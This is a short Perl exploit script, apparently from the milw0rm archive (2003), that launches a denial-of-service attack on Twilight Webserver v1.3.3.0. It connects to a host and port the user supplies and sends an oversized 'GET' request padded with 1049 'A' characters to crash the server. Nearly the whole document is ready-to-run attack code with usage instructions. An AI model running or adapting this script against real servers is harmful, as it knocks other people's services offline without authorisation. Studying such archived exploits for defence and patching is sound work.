# Denial of Service Attack against Twilight Webserver v1.3.3.0
# http://www.twilightutilities.com
# Original author wanted the c code removed.
# /str0ke

use strict;
use IO::Socket;

sub usage
{
    print "Denial of Service Attack against Twilight Webserver v1.3.3.0\n";
    print "Usage: $0 www.example.com port\n";
    exit ();
}

my $host= shift || &usage;
my $port= shift || 80;

my $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto => 'tcp') or die("Connect issue");

# pretty close to the output of the c code.
print $sock "GET" . "A" x 1049 . "\r\n";

# milw0rm.com [2003-07-07]